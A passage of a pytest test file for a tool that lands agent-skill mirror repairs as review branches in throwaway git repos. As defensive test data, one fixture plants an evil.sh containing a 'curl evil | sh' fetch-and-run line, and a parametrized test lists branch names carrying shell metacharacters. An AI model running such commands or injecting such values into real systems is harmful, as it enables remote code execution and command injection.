"""Class A landing: a verified mirror repair becomes a reviewable branch.

Every test uses a real fixture repository with genuine agent-skill mirror drift
and a local bare remote in ``tmp_path``.  Nothing here can reach a real origin.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

import gaia_cli.steward.landing as landing
from gaia_cli.steward.landing import (
    LandingError,
    LandingPlan,
    execute_class_a_landing,
    plan_class_a_landing,
)
from gaia_cli.steward.models import AuthorityClass, Debt, Priority, Subject
from gaia_cli.steward.policy import POLICY_RELATIVE_PATH, StewardPolicy
from gaia_cli.steward.repairs import RepairError

from tests.steward.sensor_fixtures import tree_digest


REPO_ROOT = Path(__file__).resolve().parents[2]
NOW = "2026-10-20T00:00:00Z"
BASE = "dev/integration"


def _git(root: Path, *args: str) -> str:
    result = subprocess.run(
        ["git", "-C", str(root), *args], capture_output=True, text=True, check=True
    )
    return result.stdout.strip()


def _write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def _commit(root: Path, message: str = "update") -> None:
    _git(root, "add", "-A")
    _git(root, "commit", "-q", "--allow-empty", "-m", message)


@pytest.fixture
def fixture(tmp_path: Path):
    """(repo, bare remote) with drift committed on the integration branch."""

    bare = tmp_path / "remote.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q", "-b", "main")
    _git(repo, "config", "user.email", "fixture@example.invalid")
    _git(repo, "config", "user.name", "Fixture")
    _git(repo, "config", "commit.gpgsign", "false")
    policy = repo / POLICY_RELATIVE_PATH
    policy.parent.mkdir(parents=True)
    shutil.copyfile(REPO_ROOT / POLICY_RELATIVE_PATH, policy)
    script = repo / "scripts/sync_agent_skill_mirror.py"
    script.parent.mkdir()
    shutil.copyfile(REPO_ROOT / "scripts/sync_agent_skill_mirror.py", script)
    _write(repo / ".agents/skills/x/SKILL.md", "# x canonical\n")
    _write(repo / ".agents/skills/x/reference/notes.md", "notes\n")
    _write(repo / ".claude/skills/x/SKILL.md", "# x stale\n")
    _write(repo / "src/app.py", "VALUE = 1\n")
    _commit(repo, "base with mirror drift")
    _git(repo, "remote", "add", "origin", str(bare))
    _git(repo, "push", "-q", "origin", "main")
    _git(repo, "remote", "set-head", "origin", "main")
    _git(repo, "push", "-q", "origin", f"main:refs/heads/{BASE}")
    # Leave the caller on a normal working branch with its own uncommitted edit.
    _git(repo, "checkout", "-q", "-b", "caller-work")
    return repo, bare


def _policy(repo: Path) -> StewardPolicy:
    return StewardPolicy.load(repo)


def _debt(
    kind: str = "agent_skill_mirror_drift", authority: AuthorityClass = AuthorityClass.A,
    subject: str = "agent-skill-mirrors",
) -> Debt:
    return Debt(
        id=f"debt:{kind}:{subject}:0123456789abcdef",
        kind=kind,
        subject=Subject("repository-surface", subject),
        source="agent-skill-mirror",
        current_state={},
        observed_state={},
        confidence=1.0,
        priority=Priority(1.0, 1.0, 1.0, 1.0, 0.1, 1.0),
        authority=authority,
        status="open",
        first_observed_at=NOW,
        last_observed_at=NOW,
        observation_count=1,
    )


def _plan(repo: Path, **overrides) -> LandingPlan:
    arguments = {"base_branch": BASE, **overrides}
    return plan_class_a_landing(repo, _policy(repo), _debt(), **arguments)


def _worktrees(repo: Path) -> list[str]:
    return [
        line for line in _git(repo, "worktree", "list", "--porcelain").splitlines()
        if line.startswith("worktree ")
    ]


# --- plan --------------------------------------------------------------------


def test_plan_is_deterministic_and_encodes_the_debt_kind(fixture) -> None:
    repo, _ = fixture
    first, second = _plan(repo), _plan(repo)
    assert first == second
    assert first.branch.startswith("steward/a/agent-skill-mirror-drift-")
    assert "_" not in first.branch
    assert len(first.branch.rsplit("-", 1)[-1]) == 12
    assert first.branch.endswith(first.fingerprint[:12])
    assert first.executor_id == "agent-skill-mirror"
    assert first.writable_path == ".claude/skills"
    assert (first.base_branch, first.remote) == (BASE, "origin")


def test_new_canonical_content_maps_to_a_new_branch(fixture) -> None:
    repo, _ = fixture
    before = _plan(repo)
    _write(repo / ".agents/skills/x/SKILL.md", "# x canonical v2\n")
    _commit(repo, "canonical moves")
    _git(repo, "push", "-q", "origin", f"HEAD:refs/heads/{BASE}")
    after = _plan(repo)
    assert after.branch != before.branch
    assert after.fingerprint != before.fingerprint


def test_a_different_debt_on_the_same_base_gets_a_different_branch(fixture) -> None:
    repo, _ = fixture
    other = plan_class_a_landing(
        repo, _policy(repo), _debt(subject="another-surface"), base_branch=BASE
    )
    assert other.branch != _plan(repo).branch


@pytest.mark.parametrize(
    "unsafe", ["has space", "semi;colon", "dollar$x", "-leading", "a..b", "back`tick", "x\ny", "../up", ""],
)
def test_unsafe_base_branch_names_are_refused(fixture, unsafe: str) -> None:
    repo, _ = fixture
    with pytest.raises(LandingError):
        _plan(repo, base_branch=unsafe)


def test_main_master_and_the_remote_default_are_refused(fixture, tmp_path: Path) -> None:
    repo, bare = fixture
    for protected in ("main", "master"):
        with pytest.raises(LandingError, match="protected"):
            _plan(repo, base_branch=protected)
    # A custom default branch is protected too, even though its name is arbitrary.
    _git(repo, "push", "-q", "origin", "main:refs/heads/trunk")
    subprocess.run(["git", "-C", str(bare), "symbolic-ref", "HEAD", "refs/heads/trunk"], check=True)
    _git(repo, "fetch", "-q", "origin")
    _git(repo, "remote", "set-head", "origin", "trunk")
    with pytest.raises(LandingError, match="default branch"):
        _plan(repo, base_branch="trunk")
    assert _plan(repo).base_branch == BASE


def test_execute_reapplies_the_target_floor_to_a_hand_built_plan(fixture) -> None:
    repo, _ = fixture
    plan = _plan(repo)
    forged = LandingPlan(**{**plan.__dict__, "base_branch": "main"})
    with pytest.raises(LandingError, match="protected"):
        execute_class_a_landing(repo, _policy(repo), forged, push=True)
    outside = LandingPlan(**{**plan.__dict__, "branch": "feature/elsewhere"})
    with pytest.raises(LandingError, match="outside steward/a/"):
        execute_class_a_landing(repo, _policy(repo), outside, push=True)
    widened = LandingPlan(**{**plan.__dict__, "writable_path": "src"})
    with pytest.raises(LandingError, match="writable path"):
        execute_class_a_landing(repo, _policy(repo), widened, push=True)


def test_class_b_and_class_c_debt_never_land(fixture) -> None:
    repo, _ = fixture
    policy = _policy(repo)
    with pytest.raises(LandingError, match="only Class A"):
        plan_class_a_landing(
            repo, policy, _debt("trust_calibration_drift", AuthorityClass.B), base_branch=BASE
        )
    with pytest.raises(LandingError, match="only Class A"):
        plan_class_a_landing(
            repo, policy, _debt("credential_leak", AuthorityClass.C), base_branch=BASE
        )


def test_a_debt_labelled_a_but_classified_otherwise_by_policy_is_refused(fixture) -> None:
    repo, _ = fixture
    mislabelled = _debt("trust_calibration_drift", AuthorityClass.A)
    with pytest.raises(LandingError, match="not A|no repair executor"):
        plan_class_a_landing(repo, _policy(repo), mislabelled, base_branch=BASE)


def test_missing_remote_base_is_a_landing_error(fixture) -> None:
    repo, _ = fixture
    with pytest.raises(LandingError, match="cannot fetch"):
        _plan(repo, base_branch="dev/does-not-exist")


# --- execute -----------------------------------------------------------------


def test_happy_path_pushes_a_branch_touching_only_the_mirror(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    base_head = _git(repo, "rev-parse", f"origin/{BASE}")

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "branch-pushed", result.reason
    assert result.base_head == base_head
    assert result.commit == _git(bare, "rev-parse", f"refs/heads/{plan.branch}")
    assert set(result.repaired_paths) == {
        ".claude/skills/x/SKILL.md",
        ".claude/skills/x/reference/notes.md",
    }
    assert result.verification["sensorStatus"] == "healthy"

    # Exactly one commit on top of the base, touching only the writable path.
    assert _git(bare, "rev-parse", f"{plan.branch}^") == base_head
    changed = _git(bare, "diff", "--name-only", base_head, plan.branch).splitlines()
    assert sorted(changed) == sorted(result.repaired_paths)
    assert all(path.startswith(".claude/skills/") for path in changed)
    # The pushed tree restores parity and leaves everything else alone.
    assert _git(bare, "show", f"{plan.branch}:.claude/skills/x/SKILL.md") == "# x canonical"
    assert _git(bare, "show", f"{plan.branch}:src/app.py") == "VALUE = 1"
    # Authorship and trailers.
    assert _git(bare, "log", "-1", "--format=%an <%ae>", plan.branch) == (
        "Gaia Steward <steward@gaiaskilltree.invalid>"
    )
    message = _git(bare, "log", "-1", "--format=%B", plan.branch)
    assert f"Steward-Debt: {plan.debt_id}" in message
    assert "Steward-Executor: agent-skill-mirror" in message
    # The integration branch itself was never moved.
    assert _git(bare, "rev-parse", f"refs/heads/{BASE}") == base_head
    assert _worktrees(repo) == [f"worktree {repo.resolve()}"]


def test_rerun_reports_already_exists_without_a_second_commit(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    first = execute_class_a_landing(repo, _policy(repo), plan, push=True)
    assert first.status == "branch-pushed"
    head = _git(bare, "rev-parse", f"refs/heads/{plan.branch}")
    count = _git(bare, "rev-list", "--count", f"refs/heads/{plan.branch}")

    second = execute_class_a_landing(repo, _policy(repo), _plan(repo), push=True)

    assert second.status == "already-exists"
    assert second.commit == head
    assert _git(bare, "rev-parse", f"refs/heads/{plan.branch}") == head
    assert _git(bare, "rev-list", "--count", f"refs/heads/{plan.branch}") == count
    assert _worktrees(repo) == [f"worktree {repo.resolve()}"]


def test_no_push_commits_locally_and_a_later_push_reuses_that_commit(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)

    local = execute_class_a_landing(repo, _policy(repo), plan, push=False)
    assert local.status == "branch-committed"
    assert _git(repo, "rev-parse", f"refs/heads/{plan.branch}") == local.commit
    assert subprocess.run(
        ["git", "-C", str(bare), "rev-parse", "--verify", "-q", f"refs/heads/{plan.branch}"],
        capture_output=True,
    ).returncode != 0

    again = execute_class_a_landing(repo, _policy(repo), plan, push=False)
    assert again.status == "already-exists" and again.commit == local.commit

    pushed = execute_class_a_landing(repo, _policy(repo), plan, push=True)
    assert pushed.status == "branch-pushed" and pushed.commit == local.commit
    assert _git(bare, "rev-parse", f"refs/heads/{plan.branch}") == local.commit


def test_no_drift_is_no_change_and_pushes_nothing(fixture) -> None:
    repo, bare = fixture
    shutil.rmtree(repo / ".claude/skills")
    shutil.copytree(repo / ".agents/skills", repo / ".claude/skills")
    _commit(repo, "repair by hand")
    _git(repo, "push", "-q", "origin", f"HEAD:refs/heads/{BASE}")
    plan = _plan(repo)

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "no_change"
    assert result.commit is None
    assert _git(bare, "branch", "--list", "steward/*") == ""
    assert _worktrees(repo) == [f"worktree {repo.resolve()}"]


def test_a_mirror_only_file_on_the_base_is_blocked_and_nothing_is_pushed(fixture) -> None:
    repo, bare = fixture
    _write(repo / ".claude/skills/orphan/SKILL.md", "# claude only\n")
    _commit(repo, "someone's mirror-only skill")
    _git(repo, "push", "-q", "origin", f"HEAD:refs/heads/{BASE}")
    plan = _plan(repo)

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "blocked"
    assert "mirror-only" in result.reason
    assert result.commit is None
    assert _git(bare, "branch", "--list", "steward/*") == ""
    assert _worktrees(repo) == [f"worktree {repo.resolve()}"]


def test_a_failed_sensor_proof_blocks_the_landing(fixture, monkeypatch: pytest.MonkeyPatch) -> None:
    repo, bare = fixture
    plan = _plan(repo)

    class FailingSensor:
        id = "agent-skill-mirror"

        def scan(self, repo_root: Path, observed_at: str):
            class Drift:
                status = "drift"

            return [Drift()]

    monkeypatch.setitem(landing._SENSORS, "agent-skill-mirror", FailingSensor)
    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)
    assert result.status == "blocked"
    assert "parity" in result.reason
    assert _git(bare, "branch", "--list", "steward/*") == ""


def test_a_stage_outside_the_writable_path_blocks_before_commit(
    fixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """If anything beyond the writable path ever reaches the index, nothing commits."""

    repo, bare = fixture
    plan = _plan(repo)
    real = landing.prepare_mirror_repair

    def sneaky(root: Path, executor, *, state_root: Path):
        transaction = real(root, executor, state_root=state_root)
        (root / "src/app.py").write_text("VALUE = 2\n", encoding="utf-8")
        subprocess.run(["git", "-C", str(root), "add", "src/app.py"], check=True)
        return transaction

    monkeypatch.setattr(landing, "prepare_mirror_repair", sneaky)
    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "blocked"
    assert "outside the executor writable path" in result.reason
    assert "src/app.py" in result.reason
    assert _git(bare, "branch", "--list", "steward/*") == ""
    assert _worktrees(repo) == [f"worktree {repo.resolve()}"]


def test_a_repair_error_is_reported_as_blocked(fixture, monkeypatch: pytest.MonkeyPatch) -> None:
    repo, _ = fixture
    plan = _plan(repo)

    def refuse(*args, **kwargs):
        raise RepairError("fixture refusal")

    monkeypatch.setattr(landing, "prepare_mirror_repair", refuse)
    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)
    assert result.status == "blocked" and "fixture refusal" in result.reason


def test_the_callers_worktree_index_and_head_are_untouched(fixture) -> None:
    repo, _ = fixture
    # A dirty edit in the caller's own mirror must neither block nor leak.
    _write(repo / ".claude/skills/x/SKILL.md", "# caller's uncommitted edit\n")
    _write(repo / "scratch.txt", "untracked\n")
    plan = _plan(repo)
    head = _git(repo, "rev-parse", "HEAD")
    branch = _git(repo, "rev-parse", "--abbrev-ref", "HEAD")
    status = _git(repo, "status", "--porcelain=v1", "--untracked-files=all")
    index = _git(repo, "ls-files", "--stage")
    before = tree_digest(repo)

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "branch-pushed"
    assert _git(repo, "rev-parse", "HEAD") == head
    assert _git(repo, "rev-parse", "--abbrev-ref", "HEAD") == branch
    assert _git(repo, "status", "--porcelain=v1", "--untracked-files=all") == status
    assert _git(repo, "ls-files", "--stage") == index
    assert tree_digest(repo) == before
    assert not (repo / ".gaia").exists()


def test_worktree_is_removed_when_the_run_dies_mid_flight(
    fixture, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    seen: list[Path] = []

    def explode(root: Path, executor, *, state_root: Path):
        seen.append(root)
        assert root.exists() and root != repo.resolve()
        raise RuntimeError("simulated crash mid-repair")

    monkeypatch.setattr(landing, "prepare_mirror_repair", explode)
    with pytest.raises(RuntimeError, match="simulated crash"):
        execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert len(seen) == 1
    assert not seen[0].exists()
    assert not seen[0].parent.exists()
    assert _worktrees(repo) == [f"worktree {repo.resolve()}"]
    assert _git(bare, "branch", "--list", "steward/*") == ""


def test_base_movement_between_plan_and_execute_blocks(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    _write(repo / ".agents/skills/x/SKILL.md", "# x canonical v3\n")
    _commit(repo, "canonical moves after planning")
    _git(repo, "push", "-q", "origin", f"HEAD:refs/heads/{BASE}")

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "blocked"
    assert "re-plan" in result.reason
    assert _git(bare, "branch", "--list", "steward/*") == ""

# =============================================================================
# Review fixes (D1-D12 and mutation gaps)
# =============================================================================

SPEC = landing.spec_by_id("agent-skill-mirror")


def _push_base(repo: Path, files: dict[str, str], message: str = "base moves") -> None:
    for relative, content in files.items():
        _write(repo / relative, content)
    _commit(repo, message)
    _git(repo, "push", "-q", "origin", f"HEAD:refs/heads/{BASE}")


def _remote_branches(bare: Path) -> str:
    return _git(bare, "branch", "--list", "steward/*")


def _local_branches(repo: Path) -> str:
    return _git(repo, "branch", "--list", "steward/*")


def _git_ok(repo: Path, *args: str) -> bool:
    return subprocess.run(["git", "-C", str(repo), *args], capture_output=True).returncode == 0


def _assert_clean_landing(repo: Path, bare: Path, plan: LandingPlan, result) -> None:
    """The pushed branch is one commit on the base whose mirror equals canonical."""

    assert result.status == "branch-pushed", result.reason
    base = _git(repo, "rev-parse", f"origin/{BASE}")
    assert _git(bare, "rev-list", "--count", f"{base}..{plan.branch}") == "1"
    assert _git(bare, "rev-parse", f"{plan.branch}^") == base
    assert _git(bare, "show", f"{plan.branch}:.claude/skills/x/SKILL.md") == "# x canonical"
    assert not _git_ok(bare, "cat-file", "-e", f"{plan.branch}:.claude/skills/x/evil.sh")
    assert _local_branches(repo) == ""


# --- D1: the default branch is the remote's answer ---------------------------


def test_the_default_branch_floor_does_not_depend_on_a_local_origin_head(fixture) -> None:
    repo, bare = fixture
    _git(repo, "push", "-q", "origin", "main:refs/heads/trunk")
    subprocess.run(["git", "-C", str(bare), "symbolic-ref", "HEAD", "refs/heads/trunk"], check=True)
    _git(repo, "remote", "set-head", "origin", "-d")
    assert not _git_ok(repo, "symbolic-ref", "-q", "refs/remotes/origin/HEAD")

    with pytest.raises(LandingError, match="default branch"):
        _plan(repo, base_branch="trunk")
    # main is no longer the default, but it stays protected by name.
    with pytest.raises(LandingError, match="protected"):
        _plan(repo, base_branch="main")
    forged = LandingPlan(**{**_plan(repo).__dict__, "base_branch": "trunk"})
    with pytest.raises(LandingError, match="default branch"):
        execute_class_a_landing(repo, _policy(repo), forged, push=True)
    assert _plan(repo).base_branch == BASE


def test_an_unanswerable_default_branch_fails_closed(
    fixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo, bare = fixture
    # Remote unreachable: ls-remote fails.
    _git(repo, "remote", "set-url", "origin", str(bare.parent / "does-not-exist.git"))
    with pytest.raises(LandingError, match="default branch"):
        _plan(repo)
    _git(repo, "remote", "set-url", "origin", str(bare))

    # Remote reachable but names no default (no symref line).
    real = landing._git

    def silent(cwd, *args, **kwargs):
        if args[:1] == ("ls-remote",) and "--symref" in args:
            return subprocess.CompletedProcess(["git"], 0, "abc123\tHEAD\n", "")
        return real(cwd, *args, **kwargs)

    monkeypatch.setattr(landing, "_git", silent)
    with pytest.raises(LandingError, match="did not report a default branch"):
        _plan(repo)


# --- D2: a failed commit leaks no ref ---------------------------------------


def test_a_failed_commit_leaves_no_branch_and_the_next_run_succeeds(
    fixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    monkeypatch.setenv("GIT_AUTHOR_DATE", "garbage")

    failed = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert failed.status == "blocked" and "cannot commit" in failed.reason
    assert _local_branches(repo) == ""
    assert _remote_branches(bare) == ""
    monkeypatch.delenv("GIT_AUTHOR_DATE")
    _assert_clean_landing(repo, bare, plan, execute_class_a_landing(repo, _policy(repo), plan, push=True))


# --- D3: the steward/a/ namespace never wedges ------------------------------


def test_a_successful_push_deletes_the_local_branch(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)
    assert result.status == "branch-pushed"
    assert _local_branches(repo) == ""
    assert _git(bare, "rev-parse", f"refs/heads/{plan.branch}") == result.commit


def test_recurrence_after_merge_and_branch_deletion_lands_again(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    first = execute_class_a_landing(repo, _policy(repo), plan, push=True)
    assert first.status == "branch-pushed"
    # Merge the PR and let the forge delete the branch.
    _git(repo, "fetch", "-q", "origin")
    _git(repo, "checkout", "-q", "-B", "tmp", f"origin/{BASE}")
    _git(repo, "merge", "-q", "--no-ff", "-m", "merge PR", f"origin/{plan.branch}")
    _git(repo, "push", "-q", "origin", f"tmp:refs/heads/{BASE}")
    _git(repo, "push", "-q", "origin", f":refs/heads/{plan.branch}")
    # The mirror drifts again; canonical is unchanged, so the branch name repeats.
    _write(repo / ".claude/skills/x/SKILL.md", "# the mirror drifted again, with a different length\n")
    _commit(repo, "drift again")
    _git(repo, "push", "-q", "origin", f"tmp:refs/heads/{BASE}")
    _git(repo, "checkout", "-q", "caller-work")

    again = _plan(repo)
    assert again.branch == plan.branch
    _assert_clean_landing(repo, bare, again, execute_class_a_landing(repo, _policy(repo), again, push=True))


def test_a_pushed_failure_leaves_a_resumable_local_branch(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    hook = bare / "hooks/pre-receive"
    hook.write_text("#!/bin/sh\necho rejected-by-test >&2\nexit 1\n", encoding="utf-8")
    hook.chmod(0o755)

    refused = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert refused.status == "blocked" and "refused" in refused.reason
    assert _remote_branches(bare) == ""
    assert _local_branches(repo) != ""  # kept: it is verified work that can be pushed later
    hook.unlink()
    _assert_clean_landing(repo, bare, plan, execute_class_a_landing(repo, _policy(repo), plan, push=True))


def _landing_commit(repo: Path, plan: LandingPlan) -> tuple[str, str]:
    """A genuine landing commit (made with push=False), returned with the base head."""

    result = execute_class_a_landing(repo, _policy(repo), plan, push=False)
    assert result.status == "branch-committed"
    _git(repo, "branch", "-D", plan.branch)
    return result.commit, result.base_head


def _commit_tree(repo: Path, tree_of: str, message: str, *parents: str) -> str:
    args = ["commit-tree", f"{tree_of}^{{tree}}", "-m", message]
    for parent in parents:
        args.extend(["-p", parent])
    return _git(repo, *args)


def _detached_edit(repo: Path, commit: str, edit) -> str:
    _git(repo, "checkout", "-q", "--detach", commit)
    edit()
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "--amend", "--no-edit")
    amended = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "caller-work")
    return amended


def _stale_variants(repo: Path, plan: LandingPlan) -> dict[str, str]:
    commit, base = _landing_commit(repo, plan)
    variants: dict[str, str] = {}
    variants["outside-scope"] = _detached_edit(
        repo, commit, lambda: _write(repo / "src/app.py", "VALUE = 99\n")
    )
    _git(repo, "checkout", "-q", "--detach", commit)
    _git(repo, "commit", "-q", "--allow-empty", "-m", "second commit")
    variants["two-commits"] = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "caller-work")
    other_parent = _commit_tree(repo, base, "a second, distinct parent")
    variants["merge"] = _commit_tree(repo, commit, "merge", base, other_parent)
    sibling = _commit_tree(repo, base, "same tree, different commit")
    variants["wrong-parent"] = _commit_tree(repo, commit, "wrong parent", sibling)

    def mode() -> None:
        (repo / ".claude/skills/x/SKILL.md").chmod(0o755)

    variants["mode"] = _detached_edit(repo, commit, mode)

    def planted() -> None:
        _write(repo / ".claude/skills/x/SKILL.md", "# NOT canonical, planted\n")
        _write(repo / ".claude/skills/x/evil.sh", "curl evil | sh\n")

    variants["planted-content"] = _detached_edit(repo, commit, planted)
    return variants


def test_every_kind_of_stale_local_branch_is_deleted_and_rebuilt(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    variants = _stale_variants(repo, plan)
    assert set(variants) == {
        "outside-scope", "two-commits", "merge", "wrong-parent", "mode", "planted-content"
    }
    for name, planted in variants.items():
        _git(repo, "branch", "-f", plan.branch, planted)
        result = execute_class_a_landing(repo, _policy(repo), plan, push=True)
        _assert_clean_landing(repo, bare, plan, result)
        assert result.commit != planted, name
        assert _git(bare, "rev-parse", f"refs/heads/{plan.branch}") != planted, name
        _git(bare, "update-ref", "-d", f"refs/heads/{plan.branch}")


def test_a_stale_branch_from_before_a_base_move_is_rebuilt(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    local = execute_class_a_landing(repo, _policy(repo), plan, push=False)
    assert local.status == "branch-committed"
    _push_base(repo, {"src/app.py": "VALUE = 2\n"}, "unrelated base move")
    moved = _plan(repo)
    assert moved.branch == plan.branch  # canonical unchanged: same name, new base

    result = execute_class_a_landing(repo, _policy(repo), moved, push=True)

    _assert_clean_landing(repo, bare, moved, result)
    assert _git(bare, "show", f"{moved.branch}:src/app.py") == "VALUE = 2"
    assert result.commit != local.commit


def test_verify_commit_rejects_non_regular_modes_even_when_both_sides_agree(fixture) -> None:
    repo, _ = fixture
    (repo / ".agents/skills/x/link").symlink_to("SKILL.md")
    _push_base(repo, {}, "canonical symlink")
    base = _git(repo, "rev-parse", "HEAD")
    (repo / ".claude/skills/x/link").symlink_to("SKILL.md")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "mirror symlink")
    tip = _git(repo, "rev-parse", "HEAD")

    problem = landing._verify_commit(repo, SPEC, tip, base)

    assert problem is not None and "non-regular" in problem


# --- D4: no worktree prune ----------------------------------------------------


def test_landing_does_not_destroy_other_worktrees_admin_data(fixture, tmp_path: Path) -> None:
    repo, _ = fixture
    other = tmp_path / "unmounted-worktree"
    _git(repo, "worktree", "add", "-q", "--detach", str(other))
    shutil.move(str(other), str(tmp_path / "moved-away"))  # a removable drive, momentarily gone
    before = sorted(path.name for path in (repo / ".git/worktrees").iterdir())
    assert before == ["unmounted-worktree"]

    result = execute_class_a_landing(repo, _policy(repo), _plan(repo), push=True)

    assert result.status == "branch-pushed"
    assert sorted(path.name for path in (repo / ".git/worktrees").iterdir()) == before


def test_cleanup_falls_back_to_removing_only_its_own_admin_entry(
    fixture, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo, _ = fixture
    other = tmp_path / "other-wt"
    _git(repo, "worktree", "add", "-q", "--detach", str(other))
    shutil.move(str(other), str(tmp_path / "other-moved"))
    real = landing._git
    seen: list[Path] = []

    def refuse_remove(cwd, *args, **kwargs):
        if args[:2] == ("worktree", "remove"):
            seen.append(Path(args[-1]))
            return subprocess.CompletedProcess(["git"], 1, "", "simulated failure")
        return real(cwd, *args, **kwargs)

    monkeypatch.setattr(landing, "_git", refuse_remove)
    result = execute_class_a_landing(repo, _policy(repo), _plan(repo), push=True)

    assert result.status == "branch-pushed"
    assert len(seen) == 1 and not seen[0].exists() and not seen[0].parent.exists()
    assert sorted(path.name for path in (repo / ".git/worktrees").iterdir()) == ["other-wt"]


# --- D5/D14: parity is proved against the committed tree --------------------------


def test_canonical_files_that_match_an_ignore_rule_still_land_and_verify(fixture, tmp_path: Path) -> None:
    repo, bare = fixture
    _write(repo / ".gitignore", "*.log\n")
    _write(repo / ".agents/skills/x/run.log", "canonical log-named asset\n")
    _git(repo, "add", "-f", ".agents/skills/x/run.log")
    _push_base(repo, {}, "force-tracked canonical log")
    plan = _plan(repo)

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    _assert_clean_landing(repo, bare, plan, result)
    assert _git(bare, "ls-tree", "-r", "--name-only", plan.branch, "--", ".claude/skills").split() == [
        ".claude/skills/x/SKILL.md", ".claude/skills/x/reference/notes.md", ".claude/skills/x/run.log",
    ]
    checkout = tmp_path / "pushed-checkout"
    subprocess.run(["git", "clone", "-q", str(bare), str(checkout)], check=True)
    _git(checkout, "checkout", "-q", plan.branch)
    check = subprocess.run(
        [sys.executable, "scripts/sync_agent_skill_mirror.py", "--check"],
        cwd=checkout, capture_output=True, text=True,
    )
    assert check.returncode == 0, check.stdout + check.stderr


def test_a_committed_tree_that_differs_from_canonical_is_blocked_not_pushed(
    fixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """If git records anything but canonical (filters, attributes), nothing ships."""

    repo, bare = fixture
    plan = _plan(repo)
    real = landing._git

    def corrupting(cwd, *args, **kwargs):
        if args[:1] == ("commit",):
            (Path(cwd) / ".claude/skills/x/SKILL.md").write_text("# tampered after staging\n", encoding="utf-8")
            real(cwd, "add", "-f", "--", ".claude/skills")
        return real(cwd, *args, **kwargs)

    monkeypatch.setattr(landing, "_git", corrupting)
    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "blocked" and "failed verification" in result.reason
    assert _remote_branches(bare) == "" and _local_branches(repo) == ""


# --- D6: hooks never run --------------------------------------------------------------


def _hook_script(marks: Path, name: str) -> str:
    return f"#!/bin/sh\necho {name} >> '{marks}'\nexit 0\n"


@pytest.mark.parametrize("configured", [True, False])
def test_no_git_hook_runs_during_a_landing(fixture, tmp_path: Path, configured: bool) -> None:
    repo, bare = fixture
    marks = tmp_path / "hook-marks"
    for name in ("post-checkout", "pre-push", "commit-msg", "pre-commit", "post-commit", "reference-transaction"):
        hook = repo / ".githooks" / name
        _write(hook, _hook_script(marks, name))
        hook.chmod(0o755)
    # The stub tripwire would (rightly) refuse a live pre-commit; keep the real stub.
    _write(repo / ".githooks/pre-commit", "#!/usr/bin/env bash\n# stub\n\nexit 0\n")
    (repo / ".githooks/pre-commit").chmod(0o755)
    _push_base(repo, {}, "hooks in the base")
    if configured:
        _git(repo, "config", "core.hooksPath", ".githooks")
    for name in ("pre-push", "post-checkout", "reference-transaction"):
        local = repo / ".git/hooks" / name
        local.write_text(_hook_script(marks, f"local-{name}"), encoding="utf-8")
        local.chmod(0o755)

    result = execute_class_a_landing(repo, _policy(repo), _plan(repo), push=True)

    assert result.status == "branch-pushed", result.reason
    assert not marks.exists(), marks.read_text() if marks.exists() else ""


@pytest.mark.parametrize(
    ("content", "refused"),
    [
        ("#!/usr/bin/env bash\n# Local hooks are CI Auto-Sync now.\n\nexit 0\n", False),
        ("#!/bin/sh\n", True),
        ("#!/bin/sh\nexit 0\npython scripts/lockstep.py\n", True),
        ("#!/bin/sh\npython scripts/lockstep.py\nexit 0\n", True),
        ("", True),
    ],
)
def test_the_hook_stub_tripwire(fixture, content: str, refused: bool) -> None:
    repo, _ = fixture
    plan = _plan(repo)  # no pre-commit at all: nothing is being skipped
    _push_base(repo, {".githooks/pre-commit": content}, "pre-commit changes")
    if refused:
        with pytest.raises(LandingError, match="no longer an 'exit 0' stub"):
            _plan(repo)
        with pytest.raises(LandingError, match="no longer an 'exit 0' stub"):
            execute_class_a_landing(repo, _policy(repo), plan, push=True)
    else:
        assert _plan(repo).branch == plan.branch


# --- D7: branch-scope.yml knows steward/a/* ----------------------------------------


def _scope_script() -> str:
    workflow = yaml.safe_load((REPO_ROOT / ".github/workflows/branch-scope.yml").read_text(encoding="utf-8"))
    steps = workflow["jobs"]["scope-check"]["steps"]
    run = next(step["run"] for step in steps if step.get("name") == "Check branch scope")
    return (
        run.replace("${{ github.event.pull_request.head.repo.full_name }}", "o/r")
